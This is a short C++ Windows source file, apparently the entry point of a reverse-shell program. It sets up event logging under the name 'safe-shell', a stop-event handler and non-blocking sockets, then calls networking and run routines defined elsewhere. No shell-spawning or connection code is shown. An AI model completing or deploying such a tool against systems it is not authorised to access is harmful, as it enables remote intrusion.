#include <ws2tcpip.h>
#include <windows.h>

#include "reverse-shell.h"

#include <iostream>

reverseShell	shell = {};
HANDLE			journalHandle;

void journalReport(std::wstring msg) {
	const wchar_t *ptr = msg.c_str();
	ReportEventW(
		journalHandle,
		EVENTLOG_INFORMATION_TYPE,
		0,
		0,
		NULL,
		1,
		0,
		&ptr,
		NULL
	);
}

static void initStopHandler(void) {
	shell.stopEventsignal = OpenEventA(
		SYNCHRONIZE,
		FALSE,
		PROCESS_STOP
	);
}

void setSocketNonBlock(SOCKET *sock) {
	u_long mode = 1;
	ioctlsocket(*sock, FIONBIO, &mode);
}

static BYTE initProcess(void) {
	
	initStopHandler();

	if (initNetworking() == FAILURE)
		return (FAILURE);

	return (SUCCESS);
}

int main() {
	journalHandle = RegisterEventSourceA(NULL, "safe-shell");

	if (initProcess() == FAILURE) {
		cleanUp();
		return (EXIT_FAILURE);
	}

	run();

	cleanUp();
	return (EXIT_SUCCESS);
}